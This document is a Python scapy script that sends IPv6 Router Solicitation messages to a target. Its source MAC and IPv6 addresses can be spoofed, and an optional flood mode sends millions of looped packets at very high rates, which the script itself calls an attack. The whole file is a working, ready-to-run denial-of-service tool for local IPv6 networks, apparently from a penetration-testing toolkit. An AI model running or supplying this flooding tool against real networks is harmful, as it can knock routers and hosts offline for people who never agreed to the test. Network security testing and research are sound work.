#!/usr/bin/python3
import argparse
import sys

import netifaces
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, ICMPv6ND_RS, ICMPv6NDOptSrcLLAddr
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sendpfast

from validate_parameters import is_valid_ipv6, is_valid_mac


def main():
    parser = argparse.ArgumentParser(description="Sending arbitrary Router Solicitation message to specified target, "
                                                 "with option to flood.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping)")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping)")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination (ff02::2"
                                                                            " if skipping)")
    parser.add_argument("-f", dest="flood", action="store_true", help="flood the target")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        args.source_ip = netifaces.ifaddresses(args.interface)[netifaces.AF_INET6][
            len(netifaces.ifaddresses(args.interface)[netifaces.AF_INET6]) - 1]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        args.destination_ip = "ff02::2"
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Generate the packet
    layer2 = Ether(src=args.source_mac)
    layer3 = IPv6(src=args.source_ip, dst=args.destination_ip)
    packet1 = layer2 / layer3 / ICMPv6ND_RS() / ICMPv6NDOptSrcLLAddr(lladdr=args.source_mac)
    if not args.flood:  # Normal situation
        sendp(packet1, verbose=False, iface=args.interface)
        print("Sending Router Solicitation message to the destination: " + args.destination_ip)

    if args.flood:  # Flooding the target
        pkt_list = []
        print("Flooding the destination: " + args.destination_ip + "with Router Solicitation messages (press Ctrl+C "
                                                                   "to stop the attack).....")
        for i in range(5000):
            pkt_list.append(packet1)
        try:
            sendpfast(pkt_list, mbps=60000, loop=5000000, iface=args.interface)
        except KeyboardInterrupt:
            sys.exit(0)


if __name__ == "__main__":
    main()
